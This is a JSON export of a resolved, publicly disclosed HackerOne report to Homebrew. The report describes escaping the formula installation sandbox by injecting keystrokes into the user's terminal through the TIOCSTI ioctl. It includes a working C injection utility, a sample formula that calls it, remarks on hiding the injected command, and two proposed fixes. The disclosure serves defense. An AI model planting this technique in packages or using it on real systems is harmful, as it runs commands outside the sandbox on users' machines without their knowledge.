@@ -1,0 +1,144 @@
+{
+  "id": 1283871,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjgzODcx",
+  "url": "https://hackerone.com/reports/1283871",
+  "title": "Bypass of the installation sandbox by injecting keystrokes with TIOCSTI",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2021-07-30T00:13:55.668Z",
+  "submitted_at": "2021-07-30T00:13:55.725Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "gedwards",
+    "url": "/gedwards",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19399,
+    "url": "https://hackerone.com/homebrew",
+    "handle": "homebrew",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/399/2f26b1d3c096d89ed989900225c128f670ab0ef0_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/399/2f26b1d3c096d89ed989900225c128f670ab0ef0_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Homebrew",
+      "twitter_handle": "MacHomebrew",
+      "website": "https://brew.sh",
+      "about": "The missing package manager for macOS (and Linux)"
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-08-30T23:46:16.614Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-08-30T23:46:16.526Z",
+  "team_member_agreed_on_going_public_at": "2021-08-30T14:43:56.686Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "While doing some internal testing recently, we ran into installation sandboxing and found a way to bypass it so that a formula's install script can execute commands outside of the sandbox.\n\nI understand from https://github.com/Homebrew/brew/issues/2986 that the sandbox is intended to prevent packages from making unwanted changes to users' systems. For example, the sandbox will prevent a formula from writing to a user's home directory like `touch /Users/$(whoami)/example` during the install stage.\n\nThe bypass takes advantage of the fact that the sandbox allows writing to /dev/tty (see [sandbox.rb](https://github.com/Homebrew/brew/blob/a427de5bee50646a974fa8acd96a62ed0fbc10fa/Library/Homebrew/sandbox.rb#L168)) and we can use the TIOCSTI ioctl on that path. TIOCSTI is a call to \"Insert the given byte in the input queue\" which fakes user input.\n\nIn other words, instead of executing the command we want, a small utility program could insert the string `touch /Users/$(whoami)/example` and then a newline into the user's terminal. Once the brew command finishes, the user's shell (outside any sandbox) receives the injected keystrokes and executes them like any other command the user types. (This was largely based on the su attack described at https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking)\n\nHere's an example of a formula using this:\n\n```\n  def install\n    system \"gcc -o bypass bypass.c\"\n    system \"echo\", \"Trying to create ~/poc-sandboxed from inside the sandbox\"\n    # the || true at the end is so the error doesn't make the whole installation fail\n    system \"touch /Users/`whoami`/poc-sandboxed || true\"\n    system \"echo\", \"Using the bypass to create ~/poc-bypassed\"\n    system \"./bypass\", \"touch /Users/`whoami`/poc-bypassed\"\n    # Do something so the installation is successful\n    bin.install \"bypass\"\n  end\n```\n\nThe bypass utility to inject a string into /dev/tty is:\n\n```\n// based on https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking\n#include <fcntl.h>\n#include <stdio.h>\n#include <string.h>\n#include <sys/ioctl.h>\nint main(int argc, char *argv[]) {\n    if( argc != 2 ) {\n        printf(\"Usage: %s \\\"command to run\\\"\\n\", argv[0]);\n        return 1;\n    }\n    int fd = open(\"/dev/tty\", O_RDWR);\n    if (fd < 0) {\n        perror(\"open\");\n        return -1;\n    }\n    int ret = ioctl(fd, TIOCSTI, \"\\n\");\n    if (ret == -1) {\n        perror(\"ioctl()\");\n    }\n    char *x = argv[1];\n    while (*x != 0) {\n        ret = ioctl(fd, TIOCSTI, x);\n        if (ret == -1) {\n            perror(\"ioctl()\");\n        }\n        x++;\n    }\n    ret = ioctl(fd, TIOCSTI, \"\\n\");\n    if (ret == -1) {\n        perror(\"ioctl()\");\n    }\n    return 0;\n}\n```\n\nI'm attaching the formula, the tarball, and a demo video which shows the file `poc-bypassed` being created in my home directory by an injected command. I typed all the other commands in the video, but not the `touch` one. In a real attack I would probably also inject a `clear` command or something like that to hide the injected command.\n\nI can think of two approaches to prevent injecting keystrokes like this:\n\n- Programs are only allowed to use TIOCSTI on their own parent terminal. It fails on other /dev/tty* devices even if they're owned by the same user. So if you can create a pty (pseudoterminal) for executing sandboxed commands, it should disconnect them from being able to write into the user's terminal where their shell is running unsandboxed. Ruby has a pty module that seems like it might work for this, but frankly I'm terrible with Ruby and didn't understand the code well enough to add this in correctly (sorry - I tried to make this a simple pull request).\n- Alternately if write access to /dev/tty can be removed from the sandbox profile, that also prevents the TIOCSTI, but that might break other packages if they legitimately write to that device. I don't know how common that is.\n\n## Impact\n\nDuring the installation process, a package can cause commands to be executed outside the sandbox just after installation finishes, making changes to the user's system that would normally be prohibited by the installation sandbox. For example, a malicious package could insert a line into .zshrc to make sure its payload gets executed every time the user opens a terminal. \n\nI consider this relatively low severity because, frankly, the user is installing something and they're probably going to execute part of it sooner or later. But it does break the goal of sandboxing: \"We're making it so users can install from any tap without fearing that it will write random files to random places on their filesystem.\"",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1393646,
+      "file_name": "bypass_demo.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1dsvyn8nmgao2032u73jzesfwfan?response-content-disposition=attachment%3B%20filename%3D%22bypass_demo.mov%22%3B%20filename%2A%3DUTF-8%27%27bypass_demo.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4S26OA6W%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T141534Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBrwAoewzxY3bz1ssFSdtEyK39n4ige2HCt%2FqgWXMxo6AiEA8W9QZL7h8ed7oBtuSQFGPQDGjUswee0LimM2YHTA1jMqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDIMSY8w9rHi0W5K3diqPBbjGizLrTlN6ZGbFF9LhBmPFJ1m5swtpZ7QtuQ1ecm6xRS32Vw6P29QnZ1nCvXxHRHo6hca4PRPlC%2F0SuWjzk0o8NKsd8UrMzywQ79MxoK3cqCgX8WV8kEyJZ1wthUKdW7fS3ASByTHh9EDJx35aAAaV%2FjyX21PDJbVpBrxSai%2BI8NCYDMrESdXzFg96JAx0%2FwVm%2BdX91kGoUyEspJy20Nir3f1bZWjC7MdtcCOSsjRRpflXb4gfaH%2BL1WT1rmstsNmGjj3W3W7TeYhR6pZtPFJdtb6k%2FghNKP4k29rXq2vgyXJX%2BVcohZ1zGAdsXYKgnKO2Y3m%2BPX7s9J%2BEwjIpNQnCTqqMY1fdtAuglpVQs9wOIOz5AsX%2F3fV3pu%2FvQSQRA8Du6Cj%2BeC4F1CXAi0KT8j%2B0b0OBcdCMFF7x0ZDWnp2IvcnhJbnULpfzrU3BcnLBK5G1w73sljokf7mqqRRV2mJeZ0Ksp5PbOgcxO2a9zF3%2F8KWFXZX25btNrQCkx2iy6DjaS4wWdbHTtaTyA9KPaMdPFCZK0C8QMd1EIcXXBkK42tdRHldBFv0Qtop0xhubZI7kmNI9gIAuHZhtoU%2F051v4TKLQUh2TAOI42M0%2BTEJLZph2o6AOjkFRtLNFt7YY1LhWRiyVjOtaBUNN8WQ3Qh3vWd2mGOGt3XUF8k06PdeLUGh8KHoKU7J50qkgwAmhpZgQn9UvombEZfjpL9rMdjKsr48SewAEp5ii613cBEjgvmV9GqfxRnaBt9%2BBnmZqq%2Bqdlb6QUuoAocNShZpYRVRCujWv0rbK5%2BJsewBiul9SD4qpCHDP0iLsOH3MbGI4L4Vl8HvxUyotCrHJVcTbSu85yQg3fmRmZR%2FKVxNQjZkwy8atrgY6sQF65KaBWFLOPDup9JZh9E6aRNnp6nOc2RJjfDBuEZqnqO%2FE0eIR6%2FMnB5jQvVkuHRSmXTStKVhFSTodnbxf6Jx%2FV%2Bb7oAvc4YN%2FjwysEYMAdJ7G1ipFcWKNk%2Fy8IJiu93NTzXgZ%2BUcmX9FJKhedbl1puxNoeG9%2FJnYsNGqtzqjFHuyw9oeW7ona11lhu%2Bwq%2BU434QKAOt%2FmsX3wWtY1amD8a%2F8TawrYCNcXdx0m%2F%2FsKhD8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=406c25fdc2220a864aacf18e39606eec969d6877397d932c10cec95b2ec8cf08",
+      "file_size": 3092996,
+      "type": "video/quicktime",
+      "moderated": null
+    },
+    {
+      "id": 1393647,
+      "file_name": "sandbox-bypass.rb",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dvjyizcbla3z3as8p3bjiy8j4n7i?response-content-disposition=attachment%3B%20filename%3D%22sandbox-bypass.rb%22%3B%20filename%2A%3DUTF-8%27%27sandbox-bypass.rb&response-content-type=text%2Fx-ruby-script&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4S26OA6W%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T141534Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBrwAoewzxY3bz1ssFSdtEyK39n4ige2HCt%2FqgWXMxo6AiEA8W9QZL7h8ed7oBtuSQFGPQDGjUswee0LimM2YHTA1jMqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDIMSY8w9rHi0W5K3diqPBbjGizLrTlN6ZGbFF9LhBmPFJ1m5swtpZ7QtuQ1ecm6xRS32Vw6P29QnZ1nCvXxHRHo6hca4PRPlC%2F0SuWjzk0o8NKsd8UrMzywQ79MxoK3cqCgX8WV8kEyJZ1wthUKdW7fS3ASByTHh9EDJx35aAAaV%2FjyX21PDJbVpBrxSai%2BI8NCYDMrESdXzFg96JAx0%2FwVm%2BdX91kGoUyEspJy20Nir3f1bZWjC7MdtcCOSsjRRpflXb4gfaH%2BL1WT1rmstsNmGjj3W3W7TeYhR6pZtPFJdtb6k%2FghNKP4k29rXq2vgyXJX%2BVcohZ1zGAdsXYKgnKO2Y3m%2BPX7s9J%2BEwjIpNQnCTqqMY1fdtAuglpVQs9wOIOz5AsX%2F3fV3pu%2FvQSQRA8Du6Cj%2BeC4F1CXAi0KT8j%2B0b0OBcdCMFF7x0ZDWnp2IvcnhJbnULpfzrU3BcnLBK5G1w73sljokf7mqqRRV2mJeZ0Ksp5PbOgcxO2a9zF3%2F8KWFXZX25btNrQCkx2iy6DjaS4wWdbHTtaTyA9KPaMdPFCZK0C8QMd1EIcXXBkK42tdRHldBFv0Qtop0xhubZI7kmNI9gIAuHZhtoU%2F051v4TKLQUh2TAOI42M0%2BTEJLZph2o6AOjkFRtLNFt7YY1LhWRiyVjOtaBUNN8WQ3Qh3vWd2mGOGt3XUF8k06PdeLUGh8KHoKU7J50qkgwAmhpZgQn9UvombEZfjpL9rMdjKsr48SewAEp5ii613cBEjgvmV9GqfxRnaBt9%2BBnmZqq%2Bqdlb6QUuoAocNShZpYRVRCujWv0rbK5%2BJsewBiul9SD4qpCHDP0iLsOH3MbGI4L4Vl8HvxUyotCrHJVcTbSu85yQg3fmRmZR%2FKVxNQjZkwy8atrgY6sQF65KaBWFLOPDup9JZh9E6aRNnp6nOc2RJjfDBuEZqnqO%2FE0eIR6%2FMnB5jQvVkuHRSmXTStKVhFSTodnbxf6Jx%2FV%2Bb7oAvc4YN%2FjwysEYMAdJ7G1ipFcWKNk%2Fy8IJiu93NTzXgZ%2BUcmX9FJKhedbl1puxNoeG9%2FJnYsNGqtzqjFHuyw9oeW7ona11lhu%2Bwq%2BU434QKAOt%2FmsX3wWtY1amD8a%2F8TawrYCNcXdx0m%2F%2FsKhD8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c719bb192fad3c7ec97f2525aa68de97f67ac3f5f877bf4486f158291a2deadb",
+      "file_size": 726,
+      "type": "text/x-ruby-script",
+      "moderated": null
+    },
+    {
+      "id": 1393648,
+      "file_name": "bypass.tar.gz",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/swd3yjpfv5pccjww4gxbope1im4f?response-content-disposition=attachment%3B%20filename%3D%22bypass.tar.gz%22%3B%20filename%2A%3DUTF-8%27%27bypass.tar.gz&response-content-type=application%2Fgzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4S26OA6W%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T141534Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBrwAoewzxY3bz1ssFSdtEyK39n4ige2HCt%2FqgWXMxo6AiEA8W9QZL7h8ed7oBtuSQFGPQDGjUswee0LimM2YHTA1jMqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDIMSY8w9rHi0W5K3diqPBbjGizLrTlN6ZGbFF9LhBmPFJ1m5swtpZ7QtuQ1ecm6xRS32Vw6P29QnZ1nCvXxHRHo6hca4PRPlC%2F0SuWjzk0o8NKsd8UrMzywQ79MxoK3cqCgX8WV8kEyJZ1wthUKdW7fS3ASByTHh9EDJx35aAAaV%2FjyX21PDJbVpBrxSai%2BI8NCYDMrESdXzFg96JAx0%2FwVm%2BdX91kGoUyEspJy20Nir3f1bZWjC7MdtcCOSsjRRpflXb4gfaH%2BL1WT1rmstsNmGjj3W3W7TeYhR6pZtPFJdtb6k%2FghNKP4k29rXq2vgyXJX%2BVcohZ1zGAdsXYKgnKO2Y3m%2BPX7s9J%2BEwjIpNQnCTqqMY1fdtAuglpVQs9wOIOz5AsX%2F3fV3pu%2FvQSQRA8Du6Cj%2BeC4F1CXAi0KT8j%2B0b0OBcdCMFF7x0ZDWnp2IvcnhJbnULpfzrU3BcnLBK5G1w73sljokf7mqqRRV2mJeZ0Ksp5PbOgcxO2a9zF3%2F8KWFXZX25btNrQCkx2iy6DjaS4wWdbHTtaTyA9KPaMdPFCZK0C8QMd1EIcXXBkK42tdRHldBFv0Qtop0xhubZI7kmNI9gIAuHZhtoU%2F051v4TKLQUh2TAOI42M0%2BTEJLZph2o6AOjkFRtLNFt7YY1LhWRiyVjOtaBUNN8WQ3Qh3vWd2mGOGt3XUF8k06PdeLUGh8KHoKU7J50qkgwAmhpZgQn9UvombEZfjpL9rMdjKsr48SewAEp5ii613cBEjgvmV9GqfxRnaBt9%2BBnmZqq%2Bqdlb6QUuoAocNShZpYRVRCujWv0rbK5%2BJsewBiul9SD4qpCHDP0iLsOH3MbGI4L4Vl8HvxUyotCrHJVcTbSu85yQg3fmRmZR%2FKVxNQjZkwy8atrgY6sQF65KaBWFLOPDup9JZh9E6aRNnp6nOc2RJjfDBuEZqnqO%2FE0eIR6%2FMnB5jQvVkuHRSmXTStKVhFSTodnbxf6Jx%2FV%2Bb7oAvc4YN%2FjwysEYMAdJ7G1ipFcWKNk%2Fy8IJiu93NTzXgZ%2BUcmX9FJKhedbl1puxNoeG9%2FJnYsNGqtzqjFHuyw9oeW7ona11lhu%2Bwq%2BU434QKAOt%2FmsX3wWtY1amD8a%2F8TawrYCNcXdx0m%2F%2FsKhD8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=08f5f4f71555b1b470345a3b14bd3db36d601641ef60a11f9e6c3eeec7cf5bf2",
+      "file_size": 484,
+      "type": "application/gzip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-09-29T14:43:56.840Z",
+  "allow_singular_disclosure_after": -74907098.05831876,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "frozensolid",
+    "akashhamal0x01",
+    "prinzhorn"
+  ],
+  "severity": {
+    "rating": "low",
+    "score": 2.0,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
